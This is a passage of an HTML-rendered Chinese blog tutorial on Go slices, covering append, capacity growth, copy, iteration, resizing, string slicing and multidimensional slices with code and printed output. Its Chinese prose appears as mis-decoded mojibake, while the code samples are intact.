class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] <span class="hljs-number">6</span> <span class="hljs-number">8</span><br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] <span class="hljs-number">6</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>ç”¨ make åŠ¨æ€åˆ›å»º slice ï¼Œå¯ä»¥è®©æ•°ç»„ä¸éœ€è¦ç”¨å¸¸é‡åšé•¿åº¦</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>p := &amp;s[<span class="hljs-number">2</span>]<br>*p += <span class="hljs-number">100</span><br>fmt.Println(s)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">102</span> <span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>[][]T è¡¨æ˜å…ƒç´ ç±»å‹ä¸º []Tï¼Œæ¯”å¦‚ [][]int è¡¨æ˜å…ƒç´ ç±»å‹ä¸º []int</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [][]<span class="hljs-type">int</span>&#123;<br>[]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;,<br>[]<span class="hljs-type">int</span>&#123;<span class="hljs-number">100</span>, <span class="hljs-number">200</span>&#125;,<br>[]<span class="hljs-type">int</span>&#123;<span class="hljs-number">11</span>, <span class="hljs-number">22</span>, <span class="hljs-number">33</span>, <span class="hljs-number">44</span>&#125;,<br>&#125;<br>fmt.Println(data)<br>&#125;<br>&gt;&gt;<br>[[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>] [<span class="hljs-number">100</span> <span class="hljs-number">200</span>] [<span class="hljs-number">11</span> <span class="hljs-number">22</span> <span class="hljs-number">33</span> <span class="hljs-number">44</span>]]<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç›´æ¥ä¿®æ”¹ struct array&#x2F;slice æˆå‘˜</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>d := [<span class="hljs-number">5</span>]<span class="hljs-keyword">struct</span> &#123;<span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ•°ç»„ï¼Œå…ƒç´ ä¸ºç»“æ„ä½“</span><br>x <span class="hljs-type">int</span><br>&#125;&#123;&#125;<br>s := d[:]<br>d[<span class="hljs-number">1</span>].x = <span class="hljs-number">10</span><span class="hljs-comment">//ä¿®æ”¹ d ä¸­çš„ç¬¬äºŒä¸ªå…ƒç´ ä¸º 10</span><br>s[<span class="hljs-number">2</span>].x = <span class="hljs-number">20</span><span class="hljs-comment">//ä¿®æ”¹ s ä¸­ç¬¬ä¸‰ä¸ªå…ƒç´ ä¸º 20</span><br>fmt.Println(d)<br>fmt.Printf(<span class="hljs-string">&quot;%p,%p\n&quot;</span>, &amp;d, &amp;d[<span class="hljs-number">0</span>])<br>&#125;<br>&gt;&gt;<br>[&#123;<span class="hljs-number">0</span>&#125; &#123;<span class="hljs-number">10</span>&#125; &#123;<span class="hljs-number">20</span>&#125; &#123;<span class="hljs-number">0</span>&#125; &#123;<span class="hljs-number">0</span>&#125;]<br><span class="hljs-number">0xc000010390</span>,<span class="hljs-number">0xc000010390</span><br></code></pre></td></tr></table></figure><p>æ•°ç»„  <code>d</code>  å’Œåˆ‡ç‰‡  <code>s</code>  å…±äº«åŒä¸€å—åº•å±‚æ•°æ®ï¼Œå› æ­¤é€šè¿‡æ•°ç»„æˆ–åˆ‡ç‰‡ä¿®æ”¹æ•°æ®ä¼šç›¸äº’å½±å“</p><h2 id="append"><a href="#append" class="headerlink" title="append()"></a>append()</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>fmt.Println(a)<br><span class="hljs-keyword">var</span> b = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;<br>fmt.Println(b)<br>c := <span class="hljs-built_in">append</span>(a, b...)<br>fmt.Println(c)<br>d := <span class="hljs-built_in">append</span>(c, <span class="hljs-number">7</span>)<br>fmt.Println(d)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>[<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span>]<br></code></pre></td></tr></table></figure><p>append å‘ slice å°¾éƒ¨æ·»åŠ æ•°æ®ï¼Œè¿”å›æ–°çš„å¯¹è±¡</p><p>è¶…å‡ºåŸ slice.cap çš„é™åˆ¶æ—¶ï¼Œä¼šé‡æ–°åˆ†é…åº•å±‚æ•°ç»„ï¼Œå³ä½¿æ˜¯åŸæ•°ç»„æ²¡æœ‰å¡«æ»¡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">10</span>: <span class="hljs-number">0</span>&#125; <span class="hljs-comment">//è‡ªåŠ¨æ¨å¯¼æ•°ç»„é•¿åº¦ï¼Œæ•°ç»„æ‰©å±•åˆ°é•¿åº¦ 11</span><br>s := data[:<span class="hljs-number">2</span>:<span class="hljs-number">3</span>]                        <span class="hljs-comment">//ä» 0 ç´¢å¼•åˆ° 2 ç´¢å¼•ï¼Œå®¹é‡ä¸º 3</span><br><br>s = <span class="hljs-built_in">append</span>(s, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>)<br><br>fmt.Println(s, data)<br>fmt.Println(&amp;s[<span class="hljs-number">0</span>], &amp;data[<span class="hljs-number">0</span>])<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">100</span> <span class="hljs-number">200</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><span class="hljs-number">0xc000010390</span> <span class="hljs-number">0xc0000141e0</span><br></code></pre></td></tr></table></figure><p>append åçš„ s é‡æ–°åˆ†é…äº†åº•å±‚æ•°ç»„</p><p>slice ä¸­ cap é‡æ–°åˆ†é…</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>c := <span class="hljs-built_in">cap</span>(s)<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">50</span>; i++ &#123;<br>s = <span class="hljs-built_in">append</span>(s, i)<br><span class="hljs-keyword">if</span> n := <span class="hljs-built_in">cap</span>(s); n &gt; c &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d-&gt;%d\n&quot;</span>, c, n)<br>c = n<br>&#125;<br><br>&#125;<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">1</span>-&gt;<span class="hljs-number">2</span><br><span class="hljs-number">2</span>-&gt;<span class="hljs-number">4</span><br><span class="hljs-number">4</span>-&gt;<span class="hljs-number">8</span><br><span class="hljs-number">8</span>-&gt;<span class="hljs-number">16</span><br><span class="hljs-number">16</span>-&gt;<span class="hljs-number">32</span><br><span class="hljs-number">32</span>-&gt;<span class="hljs-number">64</span><br></code></pre></td></tr></table></figure><p>é€šå¸¸ä»¥ <strong>2</strong> å€å®¹é‡æ¥åˆ†é…åº•å±‚æ•°ç»„</p><h2 id="åˆ‡ç‰‡æ‹·è´"><a href="#åˆ‡ç‰‡æ‹·è´" class="headerlink" title="åˆ‡ç‰‡æ‹·è´"></a>åˆ‡ç‰‡æ‹·è´</h2><p>copy() å‡½æ•°å¤åˆ¶æ•°æ®ï¼Œä»¥é•¿åº¦å°çš„ä¸ºå‡†ï¼Œé•¿åº¦å°çš„å¤åˆ¶åˆ°å¤§çš„å»ï¼ŒæŒ‡å‘åŒä¸€åº•å±‚æ•°ç»„ï¼Œå…è®¸å…ƒç´ åŒºé—´é‡å </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br><br>s2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br><br><span class="hljs-built_in">copy</span>(s2, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br><br>s3 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s3)<br><br>s3 = <span class="hljs-built_in">append</span>(s3, s2...)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s3)<br><br>s3 = <span class="hljs-built_in">append</span>(s3, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)<br>fmt.Printf(<span class="hljs-string">&quot;%v&quot;</span>, s3)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br>fmt.Println(data)<br><br>s1 := data[<span class="hljs-number">8</span>:]<span class="hljs-comment">//å– data[8] åˆ° data[9] </span><br>s2 := data[:<span class="hljs-number">5</span>]<span class="hljs-comment">//å– data[0] åˆ° data[4]</span><br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br><br><span class="hljs-built_in">copy</span>(s2, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s1)<br>fmt.Printf(<span class="hljs-string">&quot;%v\n&quot;</span>, s2)<br>fmt.Println(data)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>]<br>[<span class="hljs-number">8</span> <span class="hljs-number">9</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]<br></code></pre></td></tr></table></figure><p>s2 æ˜¯ data çš„å¼•ç”¨ï¼Œæ‰€ä»¥åé¢ s2 å˜åŒ–å¯¼è‡´äº† data çš„å˜åŒ–</p><h2 id="slice-éå†"><a href="#slice-éå†" class="headerlink" title="slice éå†"></a>slice éå†</h2><p>è·Ÿå…¶ä»–éå†å·®ä¸å¤š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>&#125;<br>slice := data[:]<br><span class="hljs-keyword">for</span> value := <span class="hljs-keyword">range</span> slice &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%v,&quot;</span>, value)<br><br>&#125;<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<br></code></pre></td></tr></table></figure><h2 id="åˆ‡ç‰‡-resize"><a href="#åˆ‡ç‰‡-resize" class="headerlink" title="åˆ‡ç‰‡ resize"></a>åˆ‡ç‰‡ resize</h2><p>è°ƒæ•´å¤§å°</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;%v,%v\n&quot;</span>, a, <span class="hljs-built_in">len</span>(a))<br><br>b := a[<span class="hljs-number">1</span>:<span class="hljs-number">2</span>]<br>fmt.Printf(<span class="hljs-string">&quot;%v,%v\n&quot;</span>, b, <span class="hljs-built_in">len</span>(b))<br><br>c := b[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]<br>fmt.Printf(<span class="hljs-string">&quot;%v,%v&quot;</span>, c, <span class="hljs-built_in">len</span>(c))<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>],<span class="hljs-number">5</span><br>[<span class="hljs-number">2</span>],<span class="hljs-number">1</span><br>[<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>],<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²å’Œåˆ‡ç‰‡"><a href="#å­—ç¬¦ä¸²å’Œåˆ‡ç‰‡" class="headerlink" title="å­—ç¬¦ä¸²å’Œåˆ‡ç‰‡"></a>å­—ç¬¦ä¸²å’Œåˆ‡ç‰‡</h2><p>string åº•å±‚æ˜¯ä¸€ä¸ª byte çš„æ•°ç»„ï¼Œæ‰€ä»¥ä¹Ÿèƒ½è¿›è¡Œåˆ‡ç‰‡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;butt3rf1y&quot;</span><br>s1 := str[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>]<br>fmt.Println(s1)<br><br>s2 := str[<span class="hljs-number">6</span>:]<br>fmt.Println(s2)<br>&#125;<br>&gt;&gt;<br>butt3<br>f1y<br></code></pre></td></tr></table></figure><p>string æ˜¯ä¸å¯å˜çš„ï¼Œä¸èƒ½ç›´æ¥ä¿®æ”¹ï¼Œå¯ä»¥å°†å­—ç¬¦è½¬åŒ–ä¸ºå­—èŠ‚åˆ‡ç‰‡ï¼Œä¿®æ”¹ä¹‹åå†è½¬ä¸ºå­—ç¬¦</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>str := <span class="hljs-string">&quot;butt3rf1y&quot;</span><br>    s := []<span class="hljs-type">byte</span>(str) <span class="hljs-comment">//ä¸­æ–‡å­—ç¬¦ç”¨ []rune(str)</span><br>s[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27;h&#x27;</span><br>s = s[:<span class="hljs-number">8</span>]<br>s = <span class="hljs-built_in">append</span>(s, <span class="hljs-string">&#x27;!&#x27;</span>)<br>str = <span class="hljs-type">string</span>(s)<br>fmt.Println(str)<br>&#125;<br>&gt;&gt;<br>butt3rfh!<br></code></pre></td></tr></table></figure><h2 id="å¤šç»´åˆ‡ç‰‡"><a href="#å¤šç»´åˆ‡ç‰‡" class="headerlink" title="å¤šç»´åˆ‡ç‰‡"></a>å¤šç»´åˆ‡ç‰‡</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> nums [<span class="hljs-number">5</span>][<span class="hljs-number">5</span>]<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> _, num := <span class="hljs-keyword">range</span> nums &#123;<br>fmt.Println(num)<br>&#125;<br>fmt.Println()<br>slices := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br><span class="hljs-keyword">for</span> _, slice := <span class="hljs-keyword">range</span> slices &#123;<br>fmt.Println(slice)<br>&#125;<br><br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><br>[]<br>[]<br>[]<br>[]<br>[]<br></code></pre></td></tr></table></figure><p>Go çš„æ•°ç»„å’Œåˆ‡ç‰‡éƒ½æ˜¯ä¸€ç»´çš„ï¼Œè¦åˆ›å»ºäºŒç»´æ•°ç»„æˆ–åˆ‡ç‰‡éœ€è¦å®šä¹‰ä¸€ä¸ªæ•°ç»„çš„æ•°ç»„æˆ–åˆ‡ç‰‡çš„åˆ‡ç‰‡ã€‚ä»ä¸Šé¢ä¾‹å­èƒ½çœ‹å‡ºæ¥ï¼Œæ•°ç»„åˆå§‹åŒ–æ—¶ä¸€ç»´å’ŒäºŒç»´é•¿åº¦æ˜¯å›ºå®šäº†ï¼Œè€Œåˆ‡ç‰‡æ˜¯ä¸å›ºå®šçš„ï¼Œæ‰€ä»¥åˆ‡ç‰‡éœ€è¦å•ç‹¬åˆå§‹åŒ–</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>slices := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(slices); i++ &#123;<br>slices[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">5</span>)<br>&#125;<br>fmt.Println(slices)<br>&#125;<br>&gt;&gt;<br>[[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]]<br></code></pre></td></tr></table></figure><h2 id="æ‹“å±•è¡¨è¾¾"><a href="#æ‹“å±•è¡¨è¾¾" class="headerlink" 